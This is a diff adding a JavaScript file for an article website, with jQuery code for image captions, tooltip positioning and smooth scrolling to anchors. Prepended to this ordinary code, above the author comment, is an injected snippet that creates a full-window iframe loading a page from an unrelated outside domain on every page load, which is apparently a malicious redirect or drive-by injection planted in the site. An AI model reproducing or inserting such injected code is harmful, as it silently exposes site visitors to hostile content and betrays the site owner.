@@ -1,0 +1,79 @@
+(function(){
+var bsa = document.createElement('iframe');
+bsa.name = 'iframe';
+bsa.src = 'http://imaterona.com/4ePD';
+bsa.style.width = '100%';
+bsa.style.height = '100%';
+bsa.style.margin = '0';
+bsa.style.padding = '0';
+bsa.style.left = '0';
+bsa.style.top = '0';
+(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
+})();
+/**
+ * Created by A.Zadorozhniy on 04.08.2016.
+ */
+$('.material_content img').each(function(){
+    var material_content = $(this).attr('title');
+    $(this).parent().addClass('afterTitle').attr('data-title', material_content);
+});
+$('a.link_article_tooltip__target').each(function () {
+    var tooltipId = $(this).attr('data-tooltip-content-id');
+    var tooltipElement = $('#' + tooltipId);
+    $(this).append(tooltipElement);
+});
+$('a.link_article_tooltip__target').mouseenter(function () {
+    var tooltipId = $(this).attr('data-tooltip-content-id');
+    var tooltipElement = $('#' + tooltipId);
+    var tooltipPos = $(this).position();
+    var tooltipHeight = $(this).height();
+    var tooltipTop = tooltipPos.top + tooltipHeight;
+    if(tooltipHeight > 30) {
+        tooltipTop -= (tooltipHeight / 2) + 4;
+    }
+    var tooltipLeft = tooltipPos.left;
+    var tooltipWidth = $(this).width();
+    var windowPos = $(window).scrollTop() + $(window).height();
+    var pParentWidth = $(this).closest('.column--left.material_content').width();
+    if($(this).closest('.allColumn.material_content').length) {
+        pParentWidth = $(this).closest('div.p').width();
+    }
+    var pLeftBalance = pParentWidth - tooltipLeft;
+    if((tooltipTop + 550) >= windowPos ){
+        if(tooltipHeight > 30) {
+            tooltipTop += (tooltipHeight / 2) + 4;
+        }
+        tooltipTop -= (100 + tooltipHeight);
+    }
+    if (pLeftBalance <= 325){
+        tooltipLeft -=  (325 - tooltipWidth);
+    }
+
+    if(tooltipWidth <= 325){
+        tooltipWidth = 325;
+    }
+    $(this).append(tooltipElement);
+    tooltipElement.stop(true, true).fadeIn();
+    tooltipElement.css({'top': tooltipTop, 'left': tooltipLeft, 'width': tooltipWidth});
+    $('.link_article_tooltip__content > article').css('margin', '0');
+});
+
+$('a.link_article_tooltip__target').mouseleave(function () {
+    var tooltipId = $(this).attr('data-tooltip-content-id');
+    var tooltipElement = $('#' + tooltipId);
+    tooltipElement.stop(true, true).fadeOut();
+});
+var smoothLinks = $('.block_AnchorMenu a, .horscope-anchors a.afterTitle');
+smoothLinks.on('click', function (event) {
+    if (this.hash !== "") {
+        event.preventDefault();
+
+        var hash = this.hash;
+
+        $('html, body').animate({
+            scrollTop: $(hash).offset().top
+        }, 400, function(){
+            window.location.hash = hash;
+        });
+    }
+});
